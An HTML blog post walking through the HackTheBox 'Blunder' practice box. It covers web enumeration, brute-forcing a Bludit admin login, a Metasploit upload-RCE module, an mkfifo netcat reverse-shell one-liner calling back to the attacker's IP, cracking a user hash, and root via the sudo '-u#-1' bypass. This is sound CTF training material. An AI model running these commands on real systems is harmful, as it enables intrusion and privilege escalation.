@@ -1,0 +1,484 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Acruxlare | HackTheBox - Blunder</title>
+  <meta name="description" content="Walkthrough of Blunder box on Hackthebox.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="HackTheBox - Blunder">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://fumenoid.github.io/posts/hackthebox-blunder">
+  <meta property="og:description" content="Walkthrough of Blunder box on Hackthebox.">
+  <meta property="og:site_name" content="Acruxlare">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://fumenoid.github.io/posts/hackthebox-blunder">
+  <meta name="twitter:title" content="HackTheBox - Blunder">
+  <meta name="twitter:description" content="Walkthrough of Blunder box on Hackthebox.">
+
+  
+    
+      <meta property="og:image" content="https://fumenoid.github.io/assets/documentation/blunderthumb-75d1538f56d6c032bd4a1f0b2604b59f6b9cb24071a14ca39aea217bd0b7e910.png">
+      <meta property="og:image:height" content="286">
+      <meta property="og:image:width" content="507">
+      <meta name="twitter:image" content="https://fumenoid.github.io/assets/documentation/blunderthumb-75d1538f56d6c032bd4a1f0b2604b59f6b9cb24071a14ca39aea217bd0b7e910.png">
+      <meta name="twitter:card" content="summary_large_image">
+    
+  
+
+  <link href="https://fumenoid.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Acruxlare Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-dark-f46876861f8611b1be1e40dbc82954f6ce18e041809dce43ba85794a93ef72e2.ico">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-dark-d161409442b7e523089f24d08d0a55951549ece7504207c376d53b020713494d.png">
+      <link rel="stylesheet" type="text/css" href="/assets/dark-831218bc9e41aef39ee6a0bae4501195bccafcc13101ae2b9cd20493a6ec04c0.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Acruxlare">Acruxlare</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about" xlink:href="/assets/about-ecf154b571ab8034ae00aeed91a3b7ad68db80b46d958753ad6216c919486e88.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="https://twitter.com/fumenoid" rel="noreferrer noopener" target="_blank" title="Twitter">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-twitter">
+  <use href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter" xlink:href="/assets/twitter-8842c33965263ad1b03a978406826677a668f94125d5837e70ab83f24b3213a7.svg#icon-twitter"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+      <li>
+        <a href="https://github.com/fumenoid" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github" xlink:href="/assets/github-094f81040819f34343ee6ffff0980f17e2807b08b595eaaf66ae3554934fd78d.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:fumenoid@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email" xlink:href="/assets/email-782473193bf750036fdb90e8daa075508a20509d01854c09f3237c144a3f0601.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/cloudsecurity">Cloudsecurity</a></li>
+    
+      
+        <li><a href="/tag/forensics">Forensics</a></li>
+    
+      
+        <li><a href="/tag/hackthebox">Hackthebox</a></li>
+    
+      
+        <li><a href="/tag/programming">Programming</a></li>
+    
+      
+        <li><a href="/tag/sorcery">Sorcery</a></li>
+    
+      
+        <li><a href="/tag/tryhackme">Tryhackme</a></li>
+    
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>HackTheBox - Blunder</h1>
+            <p>Walkthrough of Blunder box on Hackthebox.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    October 16, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      8 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/hackthebox" title="See all posts with tag 'hackthebox'">hackthebox</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/documentation/blunder-488963ee26a92f7da214a3a3d5bfc53eaf11671ec2052b5207054b75b66fe978.webp">
+  <img src="/assets/documentation/blunder-488963ee26a92f7da214a3a3d5bfc53eaf11671ec2052b5207054b75b66fe978.webp" alt="HTB Blunder" class="zooming" data-rjs="/assets/documentation/blunder-488963ee26a92f7da214a3a3d5bfc53eaf11671ec2052b5207054b75b66fe978.webp" data-zooming-width="1200" data-zooming-height="675" />
+</a></p>
+
+<h2 id="htb---blunder">HTB - Blunder</h2>
+
+<p>IP - 10.10.10.191</p>
+
+<h3 id="overview">Overview</h3>
+
+<p>This box was an easy level linux box on HTB created by <a href="https://www.hackthebox.eu/home/users/profile/94858">egotisticalSW</a>, it started with discovering a <code class="highlighter-rouge">todo.txt</code> file on the webserver which had a username <code class="highlighter-rouge">fergus</code>, we use that username to bruteforce using the passlist created from the website using <code class="highlighter-rouge">cewl</code> into the <code class="highlighter-rouge">admin</code> pannel of <code class="highlighter-rouge">bludit</code>. We use these auth creds in <code class="highlighter-rouge">Metasploit</code> exploit <code class="highlighter-rouge">exploit/linux/http/bludit_upload_images_exec</code> to get a shell on the server. On enumerating the box we find a newer version of <code class="highlighter-rouge">bludit</code> on the box which has the hashed password of user <code class="highlighter-rouge">hugo</code>, after cracking it we can get the access as user <code class="highlighter-rouge">Hugo</code>. Root is based on a <code class="highlighter-rouge">sudo</code> vulnerability was the easiest part of the box.</p>
+
+<h3 id="enumeration">Enumeration</h3>
+
+<p>As always let’s start off with nmap script nmap -sC for default scripts <del>Alright, if it isn’t obvious yet I am a IPPSEC fanboi.</del> Aight, firing up nmap to scan all open ports on the box.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/results 10.10.10.191</code></pre></figure>
+
+<p>And here is our nmap result</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># Nmap 7.80 scan initiated Mon Jun  1 00:33:39 2020 as: nmap -sC -sV -o nmap_results 10.10.10.191</span>
+Nmap scan report <span class="k">for </span>10.10.10.191
+Host is up <span class="o">(</span>0.78s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Mon Jun  1 00:35:13 2020 -- 1 IP address (1 host up) scanned in 94.25 seconds</span></code></pre></figure>
+
+<p>Intresting, only one port open. Alright let’s run an all port scan <code class="highlighter-rouge">nmap -p- -T4 10.10.10.191</code> and start enumerating the websever.</p>
+
+<h4 id="enumerating-the-web-server">Enumerating the web server</h4>
+
+<p><a href="/assets/documentation/blunderwebserver-6efaaeb1b83c3a3f54cecab58ca48d106211fc6f69f34ee25c709944f80e2d19.webp">
+  <img src="/assets/documentation/blunderwebserver-6efaaeb1b83c3a3f54cecab58ca48d106211fc6f69f34ee25c709944f80e2d19.webp" alt="HTB Blunder" class="zooming" data-rjs="/assets/documentation/blunderwebserver-6efaaeb1b83c3a3f54cecab58ca48d106211fc6f69f34ee25c709944f80e2d19.webp" data-zooming-width="1366" data-zooming-height="714" />
+</a></p>
+
+<p>About section has a note <code class="highlighter-rouge">I created this site to dump my fact files, nothing more.......?</code>, did some basic enum like checking for <code class="highlighter-rouge">robots.txt</code>, reading source code but got nothing. So let’s start a gobuster scan for directory fuzzing.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
+└──╼ <span class="nv">$gobuster</span> <span class="nb">dir</span> <span class="nt">-u</span> http://10.10.10.191 <span class="nt">-w</span> /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt <span class="nt">-x</span> txt,php <span class="nt">-o</span> gobuster_result <span class="nt">-t</span> 120
+<span class="o">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
+<span class="o">===============================================================</span>
+<span class="o">[</span>+] Url:            http://10.10.10.191
+<span class="o">[</span>+] Threads:        120
+<span class="o">[</span>+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
+<span class="o">[</span>+] User Agent:     gobuster/3.0.1
+<span class="o">[</span>+] Extensions:     php,txt
+<span class="o">[</span>+] Timeout:        10s
+<span class="o">===============================================================</span>
+2020/10/17 17:31:28 Starting gobuster
+<span class="o">===============================================================</span>
+/about <span class="o">(</span>Status: 200<span class="o">)</span>
+/0 <span class="o">(</span>Status: 200<span class="o">)</span>
+/admin <span class="o">(</span>Status: 301<span class="o">)</span>
+/install.php <span class="o">(</span>Status: 200<span class="o">)</span>
+/robots.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+/usb <span class="o">(</span>Status: 200<span class="o">)</span>
+/todo.txt <span class="o">(</span>Status: 200<span class="o">)</span>
+<span class="o">===============================================================</span></code></pre></figure>
+
+<p><code class="highlighter-rouge">todo.txt</code> and <code class="highlighter-rouge">admin</code> page looks interesting, checking out the <code class="highlighter-rouge">todo.txt</code> file first.</p>
+
+<p><a href="/assets/documentation/blundertodo-1ad16d14f362f0d1d39435014971cca89444770d16002d95c2f1f925fab2ab43.webp">
+  <img src="/assets/documentation/blundertodo-1ad16d14f362f0d1d39435014971cca89444770d16002d95c2f1f925fab2ab43.webp" alt="HTB Blunder" class="zooming" data-rjs="/assets/documentation/blundertodo-1ad16d14f362f0d1d39435014971cca89444770d16002d95c2f1f925fab2ab43.webp" data-zooming-width="1366" data-zooming-height="714" />
+</a></p>
+
+<p><code class="highlighter-rouge">fergus</code> looks like a username. <br />
+Let’s check the <code class="highlighter-rouge">/admin</code> pannel.</p>
+
+<p><a href="/assets/documentation/blunderadmin-264dc34120abab3a71966f168f527b48b664bcbdd74f76726590d56edadbb0c1.webp">
+  <img src="/assets/documentation/blunderadmin-264dc34120abab3a71966f168f527b48b664bcbdd74f76726590d56edadbb0c1.webp" alt="HTB Blunder" class="zooming" data-rjs="/assets/documentation/blunderadmin-264dc34120abab3a71966f168f527b48b664bcbdd74f76726590d56edadbb0c1.webp" data-zooming-width="1366" data-zooming-height="715" />
+</a></p>
+
+<p><code class="highlighter-rouge">Bludit</code> is a <code class="highlighter-rouge">CMS</code> and searching <code class="highlighter-rouge">Bludit</code> in <code class="highlighter-rouge">metasploit</code> gives us a RCE exploit but it needs the authentication creds of admin pannel.</p>
+
+<h4 id="foothold">Foothold</h4>
+
+<p>Time to analyse what information we have gathered so far. First a username <code class="highlighter-rouge">fergus</code>, Second a <code class="highlighter-rouge">metasploit exploit module</code> for bludit that can give us <code class="highlighter-rouge">RCE</code> but needs authentication creds. Also the note in website’s about section <code class="highlighter-rouge">I created this site to dump my fact files, nothing more.......?</code>, so it can be assumed we need to brute force creds of user <code class="highlighter-rouge">fergus</code> and the password might be any word in the website as it is to dump fact files of the user. <em>NGL.. I had a hard time figuring out that we need the wordlist created from the website to bruteforce.</em></p>
+
+<p>Creating the wordlist.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
+└──╼ <span class="nv">$cewl</span> http://10.10.10.191 <span class="o">&gt;</span> wordlist.txt</code></pre></figure>
+
+<p>Bruteforcing the /admin page using the creds will give us the creds <code class="highlighter-rouge">fergus:RolandDeschain</code>.<br />
+Now let’s use <code class="highlighter-rouge">metasploit</code> to get a shell on the box. <em>You can also do it manually exploit but I was a beginner when I did this box first time so I used metasploit for it.</em></p>
+
+<p>Finding the exploit</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msf6 <span class="o">&gt;</span> search bludit
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                          Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                          <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/linux/http/bludit_upload_images_exec  2019-09-07       excellent  Yes    Bludit Directory Traversal Image File Upload Vulnerability
+
+
+msf6 <span class="o">&gt;</span> use 0
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to php/meterpreter/reverse_tcp</code></pre></figure>
+
+<p>Now you can use <code class="highlighter-rouge">show exploit</code> to list all options in the exploit, we need to set bludit’s user and password, it can be simply done by <code class="highlighter-rouge">set BLUDITUSER fergus</code> and <code class="highlighter-rouge">set BLUDITPASS RolandDeschain</code>. Similarly set the value of RHOST, LHOST and LPORT. <em>My configuration looked like this after setting the values.</em></p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">Module options <span class="o">(</span>exploit/linux/http/bludit_upload_images_exec<span class="o">)</span>:
+
+   Name        Current Setting  Required  Description
+   <span class="nt">----</span>        <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   BLUDITPASS  RolandDeschain   <span class="nb">yes       </span>The password <span class="k">for </span>Bludit
+   BLUDITUSER  fergus           <span class="nb">yes       </span>The username <span class="k">for </span>Bludit
+   Proxies                      no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
+   RHOSTS      10.10.10.191     <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, range CIDR identifier, or hosts file with syntax <span class="s1">'file:&lt;path&gt;'</span>
+   RPORT       80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
+   SSL         <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
+   TARGETURI   /                <span class="nb">yes       </span>The base path <span class="k">for </span>Bludit
+   VHOST                        no        HTTP server virtual host
+
+Payload options <span class="o">(</span>php/meterpreter/reverse_tcp<span class="o">)</span>:
+
+   Name   Current Setting  Required  Description
+   <span class="nt">----</span>   <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
+   LHOST  10.10.14.10      <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
+   LPORT  9889             <span class="nb">yes       </span>The listen port
+<span class="o">[</span>Redacted]</code></pre></figure>
+
+<p>After setting things up, simply type <code class="highlighter-rouge">exploit</code> or <code class="highlighter-rouge">run</code>.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">msf6 exploit<span class="o">(</span>linux/http/bludit_upload_images_exec<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.10:9889 
+<span class="o">[</span>+] Logged <span class="k">in </span>as: fergus
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Retrieving UUID...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading WlFeAwiWEb.png...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading .htaccess...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Executing WlFeAwiWEb.png...
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>39189 bytes<span class="o">)</span> to 10.10.10.191
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>10.10.14.10:9889 -&gt; 10.10.10.191:54674<span class="o">)</span> at 2020-10-17 18:15:18 +0530
+<span class="o">[</span>+] Deleted .htaccess
+
+meterpreter <span class="o">&gt;</span> getuid
+Server username: www-data <span class="o">(</span>33<span class="o">)</span></code></pre></figure>
+
+<p>Alright we got a shell on the server as user <code class="highlighter-rouge">www-data</code>.</p>
+
+<h3 id="getting-user">Getting User</h3>
+
+<p>During basic enumeration I found a file <code class="highlighter-rouge">user.php</code> in <code class="highlighter-rouge">/var/www/bludit-3.9.2/bl-content/databases</code> which had password of users but it was a rabbit hole as those passwords were encrypted with a salt. but on enumerating more in <code class="highlighter-rouge">/var/www</code> we can found an newer version of bludit <code class="highlighter-rouge">bludit-3.10.0a</code> and the password’s in newer version’s <code class="highlighter-rouge">user.php</code> aren’t salted.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">meterpreter <span class="o">&gt;</span> <span class="nb">cat </span>users.php
+&lt;?php defined<span class="o">(</span><span class="s1">'BLUDIT'</span><span class="o">)</span> or die<span class="o">(</span><span class="s1">'Bludit CMS.'</span><span class="o">)</span><span class="p">;</span> ?&gt;
+<span class="o">{</span>
+    <span class="s2">"admin"</span>: <span class="o">{</span>
+        <span class="s2">"nickname"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"firstName"</span>: <span class="s2">"Hugo"</span>,
+        <span class="s2">"lastName"</span>: <span class="s2">""</span>,
+        <span class="s2">"role"</span>: <span class="s2">"User"</span>,
+        <span class="s2">"password"</span>: <span class="s2">"faca404fd5c0a31cf1897b823c695c85cffeb98d"</span>,
+        <span class="s2">"email"</span>: <span class="s2">""</span>,
+        <span class="s2">"registered"</span>: <span class="s2">"2019-11-27 07:40:55"</span>,
+        <span class="s2">"tokenRemember"</span>: <span class="s2">""</span>,
+        <span class="s2">"tokenAuth"</span>: <span class="s2">"b380cb62057e9da47afce66b4615107d"</span>,
+        <span class="s2">"tokenAuthTTL"</span>: <span class="s2">"2009-03-15 14:00"</span>,
+        <span class="o">[</span>REDACTED]
+<span class="o">}</span></code></pre></figure>
+
+<p>Throwing the hash <code class="highlighter-rouge">faca404fd5c0a31cf1897b823c695c85cffeb98d</code> in crackstation gives us user Hugo’s password - <code class="highlighter-rouge">Password120</code>. To get a shell from meterpreter use shell command and then use <code class="highlighter-rouge">su Hugo</code> and give the password <code class="highlighter-rouge">Password120</code> and we got our user.</p>
+
+<p>You can directly jump to <a href="https://fumenoid.github.io/posts/htb-blunder#rooting-the-box">root part</a>..<br />
+I am covering an issue I faced during this box… IDK why but my meterpreter was messing up when I used shell command, maybe I used a wrong payload. So I executed a nc reverse shell command and got another shell nc. <em>yes I could have changed the meterpreter payload and reused bludit exploit.</em></p>
+
+<p><a href="/assets/documentation/blundermeta-fae246fe80053d445b611f5d42c725f0ddef05171098089efa05165f1d26a8d8.webp">
+  <img src="/assets/documentation/blundermeta-fae246fe80053d445b611f5d42c725f0ddef05171098089efa05165f1d26a8d8.webp" alt="HTB Blunder" class="zooming" data-rjs="/assets/documentation/blundermeta-fae246fe80053d445b611f5d42c725f0ddef05171098089efa05165f1d26a8d8.webp" data-zooming-width="1185" data-zooming-height="632" />
+</a></p>
+
+<p>I tried <code class="highlighter-rouge">nc 10.10.14.10 9001 -e /bin/bash</code> it didn’t work, So i used this nc revershell command to get a revshell.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">meterpreter <span class="o">&gt;</span> execute <span class="nt">-f</span> <span class="s1">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.10 9001 &gt;/tmp/f'</span> <span class="nt">-H</span> 
+Process 4585 created.
+meterpreter <span class="o">&gt;</span> </code></pre></figure>
+
+<p>Netcat listner</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
+└──╼ <span class="nv">$rlwrap</span> nc <span class="nt">-lvnp</span> 9001
+listening on <span class="o">[</span>any] 9001 ...
+connect to <span class="o">[</span>10.10.14.10] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.191] 49942
+/bin/sh: 0: cant access <span class="nb">tty</span><span class="p">;</span> job control turned off
+<span class="nv">$ </span><span class="nb">whoami
+</span>www-data
+<span class="nv">$ </span>python <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>
+www-data@blunder:/<span class="nv">$ </span>su hugo
+su hugo
+Password: Password120
+
+hugo@blunder:/<span class="nv">$ </span><span class="nb">cd
+cd
+</span>hugo@blunder:~<span class="nv">$ </span><span class="nb">wc</span> <span class="nt">-c</span> user.txt
+<span class="nb">wc</span> <span class="nt">-c</span> user.txt
+33 user.txt</code></pre></figure>
+
+<h3 id="rooting-the-box">Rooting the box</h3>
+
+<p>As we have user’s <code class="highlighter-rouge">Hugo</code> password, check if we have any sudo perms.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hugo@blunder:/tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> <span class="nt">-l</span>
+Password: Password120
+Matching Defaults entries <span class="k">for </span>hugo on blunder:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User hugo may run the following commands on blunder:
+    <span class="o">(</span>ALL, <span class="o">!</span>root<span class="o">)</span> /bin/bash</code></pre></figure>
+
+<p>It reminded me of a <code class="highlighter-rouge">sudo</code> vulnerability, as I did something similar in a THM room (It could have been easily discovered using any enum script like linpeas too..), so checking the sudo version.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hugo@blunder:/tmp<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-V</span>
+<span class="nb">sudo</span> <span class="nt">-V</span>
+Sudo version 1.8.25p1
+Sudoers policy plugin version 1.8.25p1
+Sudoers file grammar version 46
+Sudoers I/O plugin version 1.8.25p1</code></pre></figure>
+
+<p>Simply Googling <code class="highlighter-rouge">sudo 1.8.25p1 exploit</code>, led us to this <a href="https://www.exploit-db.com/exploits/47502">exploit</a>. If you read the exploit the perms match our current <code class="highlighter-rouge">sudo -l</code> perms.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">hugo@blunder:/<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+<span class="nb">sudo</span> <span class="nt">-u</span><span class="c">#-1 /bin/bash</span>
+Password: Password120
+root@blunder:/# <span class="nb">whoami
+whoami
+</span>root
+root@blunder:/# <span class="nb">cd</span> /root
+<span class="nb">cd</span> /root
+root@blunder:/root# <span class="nb">wc</span> <span class="nt">-c</span> root.txt
+<span class="nb">wc</span> <span class="nt">-c</span> root.txt
+33 root.txt
+root@blunder:/root</code></pre></figure>
+
+<h4 id="extra">Extra</h4>
+
+<p>If you read the <code class="highlighter-rouge">todo.txt</code> file properly.</p>
+
+<figure class="highlight"><pre><code class="language-bash" data-lang="bash">┌─[fumenoid@parrot]─[~/Desktop/Fumenoid/Pentest/HTB/Blunder_Rooted]
+└──╼ <span class="nv">$cat</span> todo.txt 
+- Update the CMS
+- Turn off FTP - DONE
+- Remove old <span class="nb">users</span> - DONE
+- Inform fergus that the new blog needs images - PENDING</code></pre></figure>
+
+<p>There are 3 hints in it.</p>
+<ol>
+  <li>username - <code class="highlighter-rouge">fergus</code></li>
+  <li><code class="highlighter-rouge">new blog needs images</code> - The bludit exploit was actually due to some vuln related to images(hint for guys who manually exploited it instead of metasploit exploit)</li>
+  <li><code class="highlighter-rouge">Update the CMS</code> - The box had two bludit version and we got the password for user in updated version.</li>
+</ol>
+
+<p>Always read <code class="highlighter-rouge">TODO notes</code> properly.</p>
+
+<h6 id="hope-you-learned-something-new-if-you-face-any-issues--have-any-query-feel-free-to-contact-me-on-social-media">Hope you learned something new, if you face any issues / have any query, feel free to contact me on social media.</h6>
+
+
+          </div>
+          <div class="article-share">
+            
+            
+            <a href="https://twitter.com/intent/tweet?url=https://fumenoid.github.io/posts/hackthebox-blunder&via=fumenoid&text=HackTheBox - Blunder : Walkthrough of Blunder box on Hackthebox." title="Share on Twitter" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M492 109.5c-17.4 7.7-36 12.9-55.6 15.3 20-12 35.4-31 42.6-53.6 -18.7 11.1-39.4 19.2-61.5 23.5C399.8 75.8 374.6 64 346.8 64c-53.5 0-96.8 43.4-96.8 96.9 0 7.6 0.8 15 2.5 22.1 -80.5-4-151.9-42.6-199.6-101.3 -8.3 14.3-13.1 31-13.1 48.7 0 33.6 17.2 63.3 43.2 80.7C67 210.7 52 206.3 39 199c0 0.4 0 0.8 0 1.2 0 47 33.4 86.1 77.7 95 -8.1 2.2-16.7 3.4-25.5 3.4 -6.2 0-12.3-0.6-18.2-1.8 12.3 38.5 48.1 66.5 90.5 67.3 -33.1 26-74.9 41.5-120.3 41.5 -7.8 0-15.5-0.5-23.1-1.4C62.8 432 113.7 448 168.3 448 346.6 448 444 300.3 444 172.2c0-4.2-0.1-8.4-0.3-12.5C462.6 146 479 129 492 109.5z"/></svg>
+            </a>
+            <a href="https://www.facebook.com/sharer/sharer.php?u=https://fumenoid.github.io/posts/hackthebox-blunder" title="Share on Facebook" rel="noreferrer noopener" target="_blank">
+              <svg viewBox="0 0 512 512"><path d="M288 192v-38.1c0-17.2 3.8-25.9 30.5-25.9H352V64h-55.9c-68.5 0-91.1 31.4-91.1 85.3V192h-45v64h45v192h83V256h56.4l7.6-64H288z"/></svg>
+            </a>
+          </div>
+
+          
+        </article>
+        <footer class="footer scrollappear">
+    <script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="fumenoid" data-color="#FFDD00" data-emoji=""  data-font="Comic" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#ffffff" ></script>
+</footer>
+
+      </div>
+    </div>
+  </main>
+  
+  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-172959519-1"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'UA-172959519-1');
+  </script>
+
+
+<script src="/assets/vendor-130c9c254effc51f3283620bc635851da7b99c20901216948f11ba72ee13317f.js" type="text/javascript"></script>
+
+
+  <script src="/assets/webfonts-96493456d319d1bf419afdf8701552d4d486fee6afd304897d4fd81eb4e0cc0b.js" type="text/javascript"></script>
+
+
+
+  <script src="/assets/scrollappear-e2da8ea567e418637e31266cc5302126eaa79f62a2273739086358b589a89ee6.js" type="text/javascript"></script>
+
+
+<script src="/assets/application-cfde13ac81ddaf4351b2e739603e2baf688d0fcc9aba613fe62bbb1c7b037fb9.js" type="text/javascript"></script>
+
+
+</body>
+</html>
